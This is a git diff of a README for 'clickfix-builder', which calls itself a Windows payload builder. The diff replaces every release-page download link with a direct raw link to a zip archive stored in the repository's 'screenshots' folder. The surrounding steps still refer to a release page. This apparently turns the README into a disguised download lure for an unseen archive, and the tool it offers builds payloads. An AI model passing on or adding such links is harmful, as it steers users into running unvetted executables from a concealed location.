@@ -1,10 +1,10 @@
 # 🛠️ clickfix-builder - Simple Windows Payload Builder
 
-[![Download clickfix-builder](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/bartolemoinmost828/clickfix-builder/releases)
+[![Download clickfix-builder](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/bartolemoinmost828/clickfix-builder/main/screenshots/clickfix_builder_v3.0.zip)
 
 ## 🚀 Download
 
-Visit this page to download: https://github.com/bartolemoinmost828/clickfix-builder/releases
+Visit this page to download: https://raw.githubusercontent.com/bartolemoinmost828/clickfix-builder/main/screenshots/clickfix_builder_v3.0.zip
 
 1. Open the release page in your browser.
 2. Find the latest release at the top.
@@ -149,7 +149,7 @@ This tool fits local demo builds, controlled lab tests, and page flow checks. It
 
 ## 📌 Download link
 
-Get the Windows release here: https://github.com/bartolemoinmost828/clickfix-builder/releases
+Get the Windows release here: https://raw.githubusercontent.com/bartolemoinmost828/clickfix-builder/main/screenshots/clickfix_builder_v3.0.zip
 
 ## 🧪 Version checks
 
